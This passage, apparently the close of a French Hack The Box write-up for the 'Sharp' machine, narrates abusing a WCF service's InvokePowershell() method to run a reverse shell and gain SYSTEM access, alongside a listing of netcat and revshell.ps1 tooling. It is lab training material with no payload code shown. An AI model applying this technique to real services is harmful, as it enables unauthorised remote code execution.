+    Répertoire <span style="color:#960050;background-color:#1e0010">:</span> C:\Users\Luks\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        09/05/2021     04<span style="color:#960050;background-color:#1e0010">:</span>01                ExploitRemotingService_Compiled-main
+d-----        08/04/2021     20<span style="color:#960050;background-color:#1e0010">:</span>14                ysoserial-dotnet
+-a----        10/05/2021     02<span style="color:#960050;background-color:#1e0010">:</span>35          27136 nc.exe
+-a----        10/05/2021     02<span style="color:#960050;background-color:#1e0010">:</span>45            500 revshell.ps1
+-a----        09/05/2021     02<span style="color:#960050;background-color:#1e0010">:</span>26           1401 Visual Studio Code.lnk
+-a----        10/05/2021     02<span style="color:#960050;background-color:#1e0010">:</span>39       11598452 wcf.zip
+</code></pre></div><p>Décompression de l&rsquo;archive puis j&rsquo;ouvre le fichier <code>wcf.sln</code> dans Visual Studio. On peut voir dans <code>Server</code> qu&rsquo;il s&rsquo;agit sans surprise du service <a href="https://docs.microsoft.com/fr-fr/dotnet/framework/wcf/whats-wcf">wcf</a> avec quatre méthodes.</p>
+<p><img src="/img/sharp/sharp-wcf.png" alt=""></p>
+<p>La méthode <code>OnStart</code> indique un service en écoute sur le port <code>8889</code> avec un endpoint nommé <code>NewSecretWcfEndpoint</code> et <code>TcpClientCredentialType.Windows</code> une authentification Windows.</p>
+<p><img src="/img/sharp/sharp-secret.png" alt=""></p>
+<p>Dans <code>Client</code>, une fonction <code>main()</code> qui se connecte au endpoint <code>NewSecretWcfEndpoint</code> en localhost et appelle trois autres fonctions :</p>
+<ul>
+<li><code>GetDiskInfo()</code></li>
+<li><code>GetCpuInfo()</code></li>
+<li><code>GetRamInfo()</code></li>
+</ul>
+<p><img src="/img/sharp/sharp-client.png" alt=""></p>
+<p>Pour terminer dans <code>RemotingLibrary</code>, on retrouve les trois fonctions de <code>client</code> et deux autres :</p>
+<ul>
+<li><code>GetUsers()</code></li>
+<li><code>InvokePowershell()</code></li>
+</ul>
+<p>La seconde est intéressante, car elle permet d&rsquo;exécuter du texte en powershell.</p>
+<p><img src="/img/sharp/sharp-pw.png" alt=""></p>
+<p>Lors de l&rsquo;énumération <code>nmap.full</code> sur tous les ports, on peut voir que le port <code>8889</code> est ouvert sur la machine.</p>
+<p><img src="/img/sharp/sharp-nmapf.png" alt=""></p>
+<p>Je modifie l&rsquo;ip pour mettre celle de la machine dans <code>Client</code> et la fonction <code>InvokePowershell()</code> avec la commande <code>get-localuser</code> pour POC, mais j&rsquo;obtiens un problème d&rsquo;identification.</p>
+<p><img src="/img/sharp/sharp-login.png" alt=""></p>
+<p>Création d&rsquo;une session cmd en réseau uniquement authentifié en tant que <code>lars</code>.</p>
+<p><img src="/img/sharp/sharp-wcf2.png" alt=""></p>
+<p>Modification de la fonction <code>InvokePowershell()</code> pour mettre notre revshell.ps1.</p>
+<p><img src="/img/sharp/sharp-rev.png" alt=""></p>
+<p>J&rsquo;exécute le fichier <code>WcfClient.exe</code> après avoir ouvert un listener sur le port <code>1337</code> et on obtient un shell en tant que <code>nt authority\system</code>, on peut récupérer le dernier flag <code>root.txt</code></p>
+<p><img src="/img/sharp/sharp-wcfc.png" alt=""></p>
+<p><img src="/img/sharp/sharp-sys.png" alt=""></p>
+<p><img src="/img/sharp/sharp-root.txt.png" alt=""></p>
+    
+</div>
+
+    
+<div class="footer">
+
+
+    
+        <div class="tags">
+            <i class="fa fa-tags"></i>
+            <div class="links">
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/powershell/">powershell</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/source-code-review/">source code review</a>
+                    
+                
+            </div>
+        </div>
+    
+
+    
+    <div class="languages">
+        <i class="fa fa-language"></i>
+        <div class="links">
+            
+                <a href="//luksec.fr/article/sharp/">en</a>
+            
+        </div>
+    </div>
+    
+</div>
+
+</article>
+
+        
+    </div>
+
+    
+        <div id="comments-container">
+            
+            
+
+        </div>
+    
+
+    </div>
+
+    
+<footer>
+    <div class="container">
+
+        
+        <div class="recent-posts">
+            <strong>Derniers articles</strong>
+            <ul>
+                
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/trick/">Hack The Box - Trick</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-forensic/">FCSC 2022 - Forensic</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-web/">FCSC 2022 - Web</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-intro/">FCSC 2022 - Intro</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/bountyhunter/">Hack The Box - BountyHunter</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/advuln/">Mise en place d&#39;un environnement AD vulnérable</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/spring4shell/">TryHackMe - Spring4shell</a>
+                    </li>
+                
+            </ul>
+        </div>
+        
+
+        
+        <div class="categories">
+            <a href="/fr/categories/"><strong>Catégories</strong></a>
+            <ul>
+                
+                <li>
+                    <a href="/fr/categories/ctf">Ctf
+                        (27)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/htb">Htb
+                        (24)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/write-up">Write up
+                        (22)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/linux">Linux
+                        (17)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/windows">Windows
+                        (4)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/fcsc">Fcsc
+                        (3)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/writeup">Writeup
+                        (3)</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+
+        <div class="right">
+            
+            <div class="external-profiles">
+                <strong>Des médias sociaux</strong>
+
+                
+                <a href="https://twitter.com/luksec_" target="_blank"><i class="fab fa-twitter"></i></a>
+                
+                <a href="https://github.com/0xLuks" target="_blank"><i class="fab fa-github"></i></a>
+                
+            </div>
+            
+
+            <div class="languages">
+                <strong>Autres langues</strong>
+                
+                
+                <a href="//luksec.fr/">en</a>
+                
+                
+                
+                <a href="//luksec.fr/fr/" class="active">fr</a>
+                
+                
+                <br><br>
+                <script src="https://www.hackthebox.eu/badge/483643"></script>
+            </div>
+            
+        </div>
+    </div>
+    <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="luks" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18">
+    </script>
+</footer>
+
+
+<div class="credits">
+    <div class="container">
+        <div class="copyright">
+            <a href="https://github.com/Lednerb" target="_blank">
+                &copy;
+                
+                2022
+                
+                by Lucas L.
+            </a>
+            
+        </div>
+        <div class="author">
+            <a href="https://github.com/Lednerb/bilberry-hugo-theme"
+                target="_blank">Bilberry Hugo Theme</a>
+        </div>
+    </div>
+</div>
+
+
+    
+
+    
+
+
+    <script type="text/javascript" src="//luksec.fr/theme.js"></script>
+
+    
+    
+    
+
+    
+</body>
+
+</html>
